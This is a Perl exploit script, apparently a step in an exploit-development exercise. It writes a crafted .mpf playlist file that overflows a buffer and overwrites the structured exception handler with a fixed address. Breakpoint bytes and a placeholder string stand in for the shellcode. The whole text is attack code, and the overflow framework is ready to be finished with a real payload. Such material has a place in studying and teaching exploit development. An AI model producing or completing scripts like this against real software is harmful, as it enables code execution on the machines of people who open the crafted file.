#!/usr/bin/perl

my $totalsize=5005;
my $sploitfile="c0d3r.mpf";
my $junk = "http://";
$junk=$junk."A" x 4105;
my $nseh="\xcc\xcc\xcc\xcc"; #breakpoint, sploit should stop here
my $seh=pack('V',0x76C37AAD);
my $shellcode="A123456789B123456789C123456789";
my $junk2 = "D" x ($totalsize-length($junk.$nseh.$seh.$shellcode));
my $payload=$junk.$nseh.$seh.$shellcode.$junk2;
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";
